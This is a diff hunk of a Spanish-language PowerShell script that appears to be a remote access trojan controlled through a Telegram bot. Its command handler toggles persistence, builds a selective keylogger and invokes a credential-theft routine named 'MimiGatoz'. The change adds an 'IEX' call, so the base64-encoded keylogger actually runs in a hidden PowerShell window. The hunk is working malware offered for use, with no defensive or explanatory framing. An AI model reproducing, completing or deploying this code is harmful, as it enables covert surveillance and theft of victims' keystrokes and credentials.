@@ -268,7 +268,7 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Persistence On") {$texto = persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Persistence Off") {$texto = remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/KeyLogger-Selective") {$texto = "Activa un KeyLogger de manera selectiva.`nEjemplo: /KeyLogger-Selective facebook"}
- if ($comando -like "/KeyLogger-Selective*") {$comando = $comando -replace "/KeyLogger-Selective ",""; $code = (crea_keylogger -extrae $comando);$code = code_a_base64 -code $code; $code = "start-process powershell.exe -ArgumentList -WindowStyle Hidden -E $code"; $texto = "Lanzado Keylogger-Selective" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
+ if ($comando -like "/KeyLogger-Selective*") {$comando = $comando -replace "/KeyLogger-Selective ",""; $code = (crea_keylogger -extrae $comando);$code = code_a_base64 -code $code; $code = "start-process powershell.exe -ArgumentList -WindowStyle Hidden -E $code"; IEX $code;  $texto = "Lanzado Keylogger-Selective" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/MimiGatoz") {mimigatoz}
 
 }
